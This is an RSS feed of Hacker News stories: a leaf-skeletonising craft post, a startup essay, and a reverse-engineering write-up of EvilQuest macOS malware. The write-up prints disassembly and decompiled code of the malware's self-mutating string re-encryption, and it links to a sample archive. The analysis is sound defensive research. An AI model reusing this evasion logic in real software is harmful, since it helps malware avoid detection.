<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Tue, 22 Sep 2020 04:24:28 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Tue, 22 Sep 2020 04:24:28 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Making Skeletonised Leaves]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24532709">thread link</a>) | @arbol
<br/>
September 20, 2020 | https://blog.lidskialf.net/2020/09/17/making-skeletonised-leaves/ | <a href="https://web.archive.org/web/*/https://blog.lidskialf.net/2020/09/17/making-skeletonised-leaves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-1332">

	

	
			<figure>
				<img width="992" height="1331" src="https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=992" alt="" loading="lazy" srcset="https://adq454703481.files.wordpress.com/2020/09/dried.jpg 992w, https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=112 112w, https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=224 224w, https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=768 768w" sizes="(max-width: 992px) 100vw, 992px" data-attachment-id="1333" data-permalink="https://blog.lidskialf.net/dried/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/dried.jpg" data-orig-size="992,1331" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600352312&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;211&quot;,&quot;shutter_speed&quot;:&quot;0.010013&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="dried" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=224" data-large-file="https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=763">			</figure><!-- .post-thumbnail -->

		
	<div>
		
<p>I decided I wanted to try making some skeletonised leaves. So I did some Googling and decided to try <a href="https://penguinbaybiology.org/make-clear-leaf-view-vein-structure/">this</a> approach.</p>



<p>We went out in the evening and gathered some leaves from the local  Shrubbery. Totally not suspicious üôÇ</p>



<figure><img data-attachment-id="1343" data-permalink="https://blog.lidskialf.net/leaves/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg" data-orig-size="992,1331" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600203574&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;909&quot;,&quot;shutter_speed&quot;:&quot;0.03&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="leaves" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=224" data-large-file="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=763" src="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=763" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=763 763w, https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=112 112w, https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=224 224w, https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/leaves.jpg 992w" sizes="(max-width: 763px) 100vw, 763px"></figure>



<p>I bought some Sodium Hydroxide and a cheap steel pot from ebay. Note: it must <strong>not</strong> be Aluminium as the Sodium Hydroxide will react with Aluminium!</p>



<figure><img data-attachment-id="1336" data-permalink="https://blog.lidskialf.net/ingredients/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg" data-orig-size="1331,998" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600381793&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;543&quot;,&quot;shutter_speed&quot;:&quot;0.03&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="ingredients" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=300" data-large-file="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=900" src="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=1024" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=1024 1024w, https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=150 150w, https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=300 300w, https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg 1331w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Although Sodium Hydroxide isn‚Äôt a deadly poison, you really don‚Äôt want it on your skin or in your eyes, so gloves/goggles are a necessity for safety. Hmm, I should really look into some sort of cheap lab coat as well to protect my clothes for this sorta stuff:</p>



<figure><img data-attachment-id="1339" data-permalink="https://blog.lidskialf.net/safety/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/safety.jpg" data-orig-size="1331,998" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600381856&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;634&quot;,&quot;shutter_speed&quot;:&quot;0.03&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="safety" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=300" data-large-file="https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=900" src="https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=1024" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=1024 1024w, https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=150 150w, https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=300 300w, https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/safety.jpg 1331w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>I scaled up the proportions to 1L of (Edinburgh) tap water and 30G of Sodium Hydroxide powder. I put them in the pot, brought it to the boil and added the leaves. </p>



<p>For fun I also tested the pH of the solution with my new pH paper (also from Ebay/China). Its about a 14, so pretty alkaline!</p>



<figure><img data-attachment-id="1340" data-permalink="https://blog.lidskialf.net/phpaper/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg" data-orig-size="992,1331" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600203853&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;108&quot;,&quot;shutter_speed&quot;:&quot;0.04001&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="phpaper" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=224" data-large-file="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=763" src="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=763" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=763 763w, https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=112 112w, https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=224 224w, https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg 992w" sizes="(max-width: 763px) 100vw, 763px"></figure>



<p>The instructions suggested boiling for about two hours, but it appears to depend on the leaves you choose. I checked on it every 20 minutes or so, and pulled leaves out as they became ready. </p>



<p>To process them, I had the following set up next to the pot:</p>



<ul><li>Tray 1: Plain tap water to wash off the Sodium Hydroxide.</li><li>Tray 2: Some ‚ÄúOrdinary Household Bleach‚Äù (aka Sodium Hypochlorite) to bleach any remaining colour out.</li><li>Tray 3: More plain tap water to wash off the bleach.</li><li>A sheet of alumunium foil to put the leaves on to dry out.</li></ul>



<p>After all of them were processed, I ended up with this:</p>



<figure><img data-attachment-id="1345" data-permalink="https://blog.lidskialf.net/drying/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/drying.jpg" data-orig-size="1331,998" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600212131&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;104&quot;,&quot;shutter_speed&quot;:&quot;0.010013&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="drying" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=300" data-large-file="https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=900" src="https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=1024" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=1024 1024w, https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=150 150w, https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=300 300w, https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/drying.jpg 1331w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The next morning I was able to unpeel the more robust leaves, yielding me these:</p>



<figure><img data-attachment-id="1346" data-permalink="https://blog.lidskialf.net/dried-1/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg" data-orig-size="992,1331" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600352312&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;211&quot;,&quot;shutter_speed&quot;:&quot;0.010013&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="dried-1" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=224" data-large-file="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=763" src="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=763" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=763 763w, https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=112 112w, https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=224 224w, https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg 992w" sizes="(max-width: 763px) 100vw, 763px"></figure>



<p>Observations</p>



<ul><li>You need to use <em>robust</em> leaves from trees. I tried some nettle leaves, but they quickly turned to mush. Some of the tree leaves appeared to process fine, but turned out to be way too delicate to remove from the foil after drying: definitely depends on the species. There may be a better way to dry them, will think on it.</li><li>Only process one species of leaf at a time, otherwise you constantly have to check each one in the pot, which means you‚Äôre disturbing them more to check.</li><li>Make sure to check on the water level! I <em>almost</em> boiled it dry.</li><li>Its fiddly! During processing, you have to <em>carefully</em> unroll the leaves by hand while wearing gloves to get them flat prior to drying.</li><li>I tried processing a dried up Oak leaf since theoretically it should be closer to being skeletonised: it didn‚Äôt seem to work very well (you can see the unsuccessful result on the aluminium foil photo).</li></ul>



<p>What Next?</p>



<p>They‚Äôre definitely more robust than I expected, but they‚Äôre still quite delicate. I fancy trying dying them and embedding them into some transparent resin next.</p>




	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://blog.lidskialf.net/2020/09/17/making-skeletonised-leaves/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532709</guid>
            <pubDate>Sun, 20 Sep 2020 08:35:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is macOS under the biggest malware attack ever?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24532184">thread link</a>) | @todsacerdoti
<br/>
September 19, 2020 | https://reverse.put.as/2020/09/17/evilquest-revisited/ | <a href="https://web.archive.org/web/*/https://reverse.put.as/2020/09/17/evilquest-revisited/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <div>
    <div>
      <article role="main">
        <p>No. I just clickbaited you but don‚Äôt leave yet, keep reading for something fun!</p>
<p>A couple of days ago I found something curious on <a href="https://www.virustotal.com/gui/">VirusTotal</a>. There were more than 40 thousand binaries with the same size in a single day. That seemed very odd so I loaded two random binaries and compared their contents. The only difference was on strings section.</p>
<p>VirusTotal detections were very low (two to three) and identified the samples as EvilQuest/ThiefQuest malware.</p>
<p>To prove that all the binaries were the same except for strings, I wrote a quick <a href="https://github.com/gdbinit/evilquest_stats">Mach-O stats</a> utility in <a href="https://golang.org/">Go</a> (yes, 2020 is this crazy!) to hash the code and strings sections separately. The hypothesis is that the code section would have the same hash for all the samples, and the strings section would have a unique hash for each sample. The output confirmed that this was indeed the case - same code, different strings.</p>
<p>Running this program against 206091 binaries totalling 34GB of data:</p>
<div><pre><code data-lang="bash">Mach-O Stats
<span>(</span>c<span>)</span> <span>2020</span> Pedro Vilaca. All Rights Reserved
 100% |‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| <span>(</span>206091/206091, <span>1563</span> it/s<span>)</span> <span>[</span>2m11s:0s<span>]</span>
__text map
cd87dfd659fc2334ccc59093c1f41ba9abf4c88046d438ddd8bc2d82f55859d7 <span>206091</span>
</code></pre></div><p>Given that the strings are encrypted/obfuscated, my first idea was that this could be a new version with mutated versions being used in different sources. Doesn‚Äôt make that much sense given that the code was the same but given that EvilQuest has ransomware features, this could be for example different BitCoin wallets for each sample.</p>
<p>Now it was time to load one of the samples into a disassembler and give a look at its contents. Assuming that the VirusTotal detections were correct even if too low, I grabbed the <a href="https://objective-see.com/downloads/malware/EvilOSX.zip">known sample</a> of EvilQuest. This sample contains debugging symbols so it‚Äôs very easy to navigate since most function names are explicit about their intents. The new sample fixed that mistake and had that information removed.</p>
<p>Before bringing the heavy diffing guns such as <a href="https://www.zynamics.com/software.html">BinDiff</a> and <a href="http://diaphora.re/">Diaphora</a> I like to give a look around to feel what‚Äôs going on. In this case the code had differences but was very similar. I could see what were clearly obfuscated/encrypted strings like in the original sample. So, I tried to find those functions using the symbols from the first sample. That was fast and easy and confirmed that the code was related (either from the same author or someone reusing it - attribution is hard :P).</p>
<p>Scott Knight released a <a href="https://github.com/carbonblack/tau-tools/tree/master/malware_specific/ThiefQuest">script</a> to decrypt/encrypt the original samples strings, but it doesn‚Äôt work with the new samples. It makes sense given that there are keys and tables that could have changed, and also what appears to be a new type of obfuscated/encrypted string format.</p>
<div><pre><code data-lang="plaintext">000Bg{0000090nQ4XL1qPsnl1ZjpKX0lkFoa0000053
</code></pre></div><p>The new strings type appears to always starts with <strong>000Bg{</strong>.</p>
<p>Learning a new programming language is easier when you have things to do with it, so I decided to write a <a href="https://github.com/gdbinit/evilquest_deobfuscator">decrypter/deobfuscator</a> in Go. In hindsight it wasn‚Äôt a smart decision because it‚Äôs kind of ugly to deal with buffers in Go and much easier in C (or I don‚Äôt know yet the best way to do it in Go).</p>
<div><pre><code data-lang="bash">$ ./evilquest_deobfuscator -s <span>"000Bg{0000090nQ4XL1qPsnl1ZjpKX0lkFoa0000053"</span>
EvilQuest String Deobfuscator
<span>(</span>c<span>)</span> <span>2020</span> Pedro Vilaca. All Rights Reserved
000Bg<span>{</span>0000090nQ4XL1qPsnl1ZjpKX0lkFoa0000053 -&gt; rb+
</code></pre></div><p>Meanwhile, the next day there were again more than 40 thousand new samples with the same size. Confirmed again that the only difference was in strings. While reversing and writing the strings decrypter I noticed that the hash of the sample I was using was modified. That generated a brain click and I went to bed thinking that this wasn‚Äôt a big malware campaign (very sad!) because it didn‚Äôt make sense with so many samples but it could be a VirusTotal issue. VirusTotal sandbox just got trapped into an analysis loop. This idea was reinforced by the fact that the sample had been submitted from the <strong>ZZ</strong> country code, meaning unknown origin. Connecting these two ideas reinforced my belief that this was the right path.</p>
<p>After I finished the <a href="https://github.com/gdbinit/evilquest_deobfuscator">strings decrypter</a> I could verify that my unique samples campaign hypothesis wasn‚Äôt valid. The strings were all the same, just encrypted/obfuscated with different keys.</p>
<p>So, the next step was to verify the code to see what was happening there. This was very easy to find since it‚Äôs the first thing the sample does.</p>
<p>At the entrypoint we can observe the mutation function being called first with <code>argv[0]</code> as its argument.</p>
<div><pre><code data-lang="plaintext">000000010001A8D0         public start
000000010001A8D0 start   proc near
(...)
000000010001A8D0         push    rbp
000000010001A8D1         mov     rbp, rsp
000000010001A8D4         sub     rsp, 2F0h
000000010001A8DB         mov     rax, cs:___stack_chk_guard_ptr
000000010001A8E2         mov     rax, [rax]
000000010001A8E5         mov     [rbp+var_8], rax
000000010001A8E9         mov     [rbp+var_94], 0
000000010001A8F3         mov     [rbp+var_98], edi
000000010001A8F9         mov     [rbp+var_A0], rsi
000000010001A900         mov     rax, [rbp+var_A0]
000000010001A907         mov     rdi, [rax]      ; argv[0]
000000010001A90A         call    fg_open_and_reencrypt_cstrings ; binary self modifies here
(...)
</code></pre></div><p>Next follows opening the executable itself with <code>rb+</code> mode (reading and writing). Fun enough there is a memory leak because the decrypted string buffer is malloc‚Äôed in the decryptor function. One of the differences from this sample versus the previous is the increased usage of dynamically allocated memory, increasing the potential for memory leaks. There are a lot more memory leaks all over the code. Xcode Instruments has a nice leak detector (<em>hint, hint</em>).</p>
<div><pre><code data-lang="plaintext">000000010001A840 fg_open_and_reencrypt_cstrings proc near
000000010001A840                                         ; CODE XREF: start+3A‚Üìp
000000010001A840
000000010001A840 var_24          = dword ptr -24h
000000010001A840 __filename      = qword ptr -20h
000000010001A840 FILE_pointer    = qword ptr -18h
000000010001A840 var_10          = qword ptr -10h
000000010001A840 var_4           = dword ptr -4
000000010001A840
000000010001A840         push    rbp
000000010001A841         mov     rbp, rsp
000000010001A844         sub     rsp, 30h
000000010001A848         mov     [rbp+var_10], rdi
000000010001A84C         mov     rdi, [rbp+var_10]
000000010001A850         lea     rax, a000bg0000090nq_18 ; "000Bg{0000090nQ4XL1qPsnl1ZjpKX0lkFoa000"...
000000010001A857         mov     [rbp+__filename], rdi
000000010001A85B         mov     rdi, rax
000000010001A85E         call    fg_decrypt_0000Bg_string ; decrypt/decode string
000000010001A863         mov     rdi, [rbp+__filename]
000000010001A867         mov     rsi, rax  ; "rb+"
000000010001A867                           ; memleak here since the returned ptr was calloc'ed
000000010001A86A         call    _fopen
000000010001A86F         mov     [rbp+FILE_pointer], rax
000000010001A873         cmp     [rbp+FILE_pointer], 0
000000010001A878         jz      loc_10001A890
000000010001A87E         mov     rdi, [rbp+FILE_pointer] ; FILE *
000000010001A882         call    _ftrylockfile
000000010001A887         cmp     eax, 0
000000010001A88A         jz      loc_10001A89C
000000010001A890
000000010001A890 loc_10001A890:            ; CODE XREF: fg_open_and_reencrypt_cstrings+38‚Üëj
000000010001A890         mov     [rbp+var_4], 0FFFFFFFFh
000000010001A897         jmp     loc_10001A8C1
000000010001A89C ; ---------------------------------------------------------------------------
000000010001A89C
000000010001A89C loc_10001A89C:            ; CODE XREF: fg_open_and_reencrypt_cstrings+4A‚Üëj
000000010001A89C         mov     rdi, [rbp+FILE_pointer] ; FILE* handle
000000010001A8A0         call    fg_reencrypt_cstrings
000000010001A8A5         mov     rdi, [rbp+FILE_pointer] ; FILE *
000000010001A8A9         call    _funlockfile
000000010001A8AE         mov     rdi, [rbp+FILE_pointer] ; FILE *
000000010001A8B2         call    _fclose
000000010001A8B7         mov     [rbp+var_4], 0
000000010001A8BE         mov     [rbp+var_24], eax
000000010001A8C1
000000010001A8C1 loc_10001A8C1:            ; CODE XREF: fg_open_and_reencrypt_cstrings+57‚Üëj
000000010001A8C1         mov     eax, [rbp+var_4]
000000010001A8C4         add     rsp, 30h
000000010001A8C8         pop     rbp
000000010001A8C9         retn
000000010001A8C9 fg_open_and_reencrypt_cstrings endp
</code></pre></div><p>The <code>fg_reencrypt_cstrings</code> function is previous listing is where the mutation occurs.
The function will find the <code>__cstring</code> section and iterate over its contents, decrypting and encrypting the strings, and write back to the binary. The original binary is already modified when it returns from <code>fg_open_and_reencrypt_cstrings</code> .</p>
<div><pre><code data-lang="c">(...)
<span>for</span> ( j <span>=</span> <span>0</span>; j <span>&lt;</span> sg<span>-&gt;</span>nsects; <span>++</span>j ) {
    v12 <span>=</span> (<span>__int64</span>)sub_100006580(a1, v17, <span>80LL</span>);
    <span>// obfuscated string is "__cstring"
</span><span></span>    v2 <span>=</span> fg_decrypt_0000Bg_string(<span>"000Bg{00000H0nQ4XL1qPsnl3oBkir1CDCUq3Z{iy|22B2MZ0000073"</span>);
    <span>if</span> ( <span>!</span>strcmp((<span>const</span> <span>char</span> <span>*</span>)v12, v2) ) {
        v11 <span>=</span> (<span>__int64</span>)sub_100006580(a1, <span>*</span>(<span>unsigned</span> <span>int</span> <span>*</span>)(v12 <span>+</span> <span>48</span>), <span>*</span>(_QWORD <span>*</span>)(v12 <span>+</span> <span>40</span>));
        v10 <span>=</span> <span>0LL</span>;
        v9 <span>=</span> <span>0LL</span>;
        v8 <span>=</span> <span>0</span>;
        fseek(a1, <span>*</span>(<span>unsigned</span> <span>int</span> <span>*</span>)(v12 <span>+</span> <span>48</span>), <span>0</span>);
        <span>while</span> ( (<span>unsigned</span> <span>__int64</span>)v8 <span>&lt;</span> <span>*</span>(_QWORD <span>*</span>)(v12 <span>+</span> <span>40</span>) ) {
            <span>if</span> ( <span>*</span>(_BYTE <span>*</span>)(v11 <span>+</span> v8) ) {
                <span>++</span>v9;
            }
            <span>else</span> <span>if</span> ( v9 ) {
                v7 <span>=</span> (<span>char</span> <span>*</span>)calloc(<span>1uLL</span>, v9 <span>+</span> <span>1</span>);
                __memcpy_chk(v7, v10 <span>+</span> v11, v9, <span>-</span><span>1LL</span>);
                v6 <span>=</span> fg_decrypt_0000Bg_string(v7);
                __s <span>=</span> (<span>char</span> <span>*</span>)fg_encrypt_0000Bg_string(v6);
                <span>if</span> ( v7 <span>!=</span> v6 ) {
                    v3 <span>=</span> strlen(__s);
                    <span>if</span> ( v3 <span>==</span> strlen(v7) ) {
                        fseek(a1, v10 <span>+</span> <span>*</span>(<span>unsigned</span> <span>int</span> <span>*</span>)(v12 <span>+</span> <span>48</span>), <span>0</span>);
                        fwrite(__s, <span>1uLL</span>, v9, a1);
                        free(v6);
                    }
                }
                free(v7);
                free(__s);
                v10 <span>+=</span> v9 <span>+</span> <span>1</span>;
                v9 <span>=</span> <span>0LL</span>;
            }
            <span>else</span> {
           ‚Ä¶</code></pre></div></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://reverse.put.as/2020/09/17/evilquest-revisited/">https://reverse.put.as/2020/09/17/evilquest-revisited/</a></em></p>]]>
            </description>
            <link>https://reverse.put.as/2020/09/17/evilquest-revisited/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532184</guid>
            <pubDate>Sun, 20 Sep 2020 06:02:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Startups are a complex multivariable equation]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24531852">thread link</a>) | @grwthckrmstr
<br/>
September 19, 2020 | https://www.preetamnath.com/blog/startups-multivariable-equation | <a href="https://web.archive.org/web/*/https://www.preetamnath.com/blog/startups-multivariable-equation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Launching a startup and building it into a successful business requires a multidisciplinary skillset. Because startups are a complex <a href="https://en.wikipedia.org/wiki/Multivariable_calculus" target="_blank">multivariable equation</a>.</p><p>You have moving target, which is somewhat in sight but not really. You‚Äôre wearing glasses but objects at a great distance are blurry.&nbsp;</p><p>The multivariable equation looks something like this</p><ul role="list"><li>understanding the market and finding a gap</li><li>coming up with a product thesis to solve the customer‚Äôs needs</li><li>finding the right distribution channels that are profitable</li><li>discovering pockets of places to find the initial set of customers</li><li>positioning the solution with the right messaging</li><li>creating the right business model and pricing structure</li><li>building competitive differentiation to fight off competition</li><li>having a founding team that has the right skillset for all the problems listed above and the million others that aren‚Äôt</li></ul><figure id="w-node-2bc32fdcbb34-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f66be2bf4382616b86f3dba_startup%20complex%20multivariable%20equation%20photo.jpg" loading="lazy" alt=""></p><figcaption><em>Photo by </em><a href="https://unsplash.com/@barkiple?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank"><em>John Barkiple</em></a></figcaption></figure><p>There‚Äôs a million reasons a startup might fail. And you cannot control those million factors of chaos.</p><p>But you can piece together parts of this equation (via discovery) and solve them one by one. Solving a piece of the equation reduces your chances of crash and burn, i.e. increases your chances of success.</p><p>The factors I‚Äôve listed above are some of the more well understood parts of this equation, and ones that you can actually control and influence.</p><p>However, it doesn‚Äôt matter if you get only solve a few parts of the equation, because one or two wrong answers such as distribution channels or business model might be enough to kill your business. That‚Äôs what runway (frugality, burn rate, funding, customer revenue) is for.</p><p>Even if you get all the above factors right, it takes a lot of time and effort for your business to take off, to build up momentum and achieve <a href="https://www.preetamnath.com/blog/momentum-escape-velocity" target="_blank">escape velocity</a>.</p><p>It boils down to - Can you solve your startup's multivariable equation before you run out of runway?</p><figure id="w-node-c061837fdebd-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f66c1f176b8944f5e9c79f3_startup%20runway.jpg" loading="lazy" alt=""></p><figcaption><em>Photo by </em><a href="https://unsplash.com/@jmoncasi?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank"><em>Jordi Moncasi</em></a><a href="https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText"></a></figcaption></figure><p>This is why a lot of successful businesses don‚Äôt do something entirely new and from the ground up. They take something existing and working and improve parts of the equation. </p><p>Zoom took WebEx and made the product delightfully easy to use.</p><p>And similarly, a lot of businesses are copycats. They copy something existing and improve upon it slightly and meaningfully. One can argue that <a href="https://invertedpassion.com/copying-ideas-is-highly-underrated/" target="_blank">copying ideas</a> is highly underrated. </p><p>Instagram Stories is basically Snapchat‚Äôs innovation, but they won because the distribution piece of the equation was far ahead.</p><p>Zoom and Instagram simply picked a multivariable equation where some of the unknowns were already solved for.</p></div></div>]]>
            </description>
            <link>https://www.preetamnath.com/blog/startups-multivariable-equation</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531852</guid>
            <pubDate>Sun, 20 Sep 2020 04:15:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Era of Regulatory Grift: TikTok-Oracle, NXP-Qualcomm, Arm-Nvidia]]>
            </title>
            <description>
<![CDATA[
